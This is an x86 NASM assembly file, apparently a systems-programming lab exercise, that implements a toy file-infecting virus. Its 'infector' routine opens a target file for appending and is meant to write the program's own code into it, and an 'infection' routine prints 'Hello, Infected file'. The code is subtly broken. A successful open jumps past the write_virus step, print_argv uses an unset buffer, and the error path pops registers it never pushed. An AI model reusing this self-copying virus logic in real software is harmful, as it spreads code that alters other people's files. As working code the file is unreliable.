start_code:
section .rodata
    hello_infected: db "Hello, Infected file", 10
    hello_infected_len: equ $ - hello_infected
    error_msg: db "Can't open file!", 10
    error_msg_len: equ $ - error_msg
section .text
global _start
global system_call
global infection
global infector
extern main
_start:
    pop    dword ecx    ; ecx = argc
    mov    esi,esp      ; esi = argv
    ;; lea eax, [esi+4*ecx+4] ; eax = envp = (4*ecx)+esi+4
    mov     eax,ecx     ; put the number of arguments into eax
    shl     eax,2       ; compute the size of argv in bytes
    add     eax,esi     ; add the size to the address of argv 
    add     eax,4       ; skip NULL at the end of argv
    push    dword eax   ; char *envp[]
    push    dword esi   ; char* argv[]
    push    dword ecx   ; int argc

    call    main        ; int main( int argc, char *argv[], char *envp[] )

    mov     ebx,eax
    mov     eax,1
    int     0x80
    nop
        
system_call:
    push    ebp             ; Save caller state
    mov     ebp, esp
    sub     esp, 4          ; Leave space for local var on stack
    pushad                  ; Save some more caller state

    mov     eax, [ebp+8]    ; Copy function args to registers: leftmost...        
    mov     ebx, [ebp+12]   ; Next argument...
    mov     ecx, [ebp+16]   ; Next argument...
    mov     edx, [ebp+20]   ; Next argument...
    int     0x80            ; Transfer control to operating system
    mov     [ebp-4], eax    ; Save returned value...
    popad                   ; Restore caller state (registers)
    mov     eax, [ebp-4]    ; place returned value where caller can see it
    add     esp, 4          ; Restore caller state
    pop     ebp             ; Restore caller state
    ret                     ; Back to caller

infection:  
    mov eax, 0x4                    ;sys_write
    mov ebx, 1                      ;stdout
    mov ecx, hello_infected            ;buffer
    mov edx, hello_infected_len        ;buffer length
    int 0x80
    ret
infector:
    open_file:
        mov eax, 0x5                    ;sys_open
        mov ebx, [esp+4]                    ;file name
        mov ecx, 2001o                      ;O_WRONLY | append
        int 0x80
        cmp eax, 0
        jl error
        mov edi, eax
        jmp print_argv
    write_virus:
        mov eax, 0x4                    ;sys_write
        mov ebx, edi                      ;stdout
        mov ecx, start_code            ;buffer
        mov edx, end_code-start_code        ;buffer length
        int 0x80
    close_file:
        mov eax, 6
        mov ebx, edi
        int 0x80
        ret
error:
    popad
    mov eax, 0x4                    ;sys_write
    mov ebx, 1                      ;stdout
    mov ecx, error_msg            ;buffer
    mov edx, error_msg_len        ;buffer length
    int 0x80
    jmp exit
end_code:

print_argv:
        mov edx, eax
        mov eax, 0x4                    ;sys_write
        mov ebx, 1                      ;stdout
        int 0x80

exit:
    mov eax, 0x1                    ;sys_exit
    mov ebx, 0                      ;exit code
    int 0x80
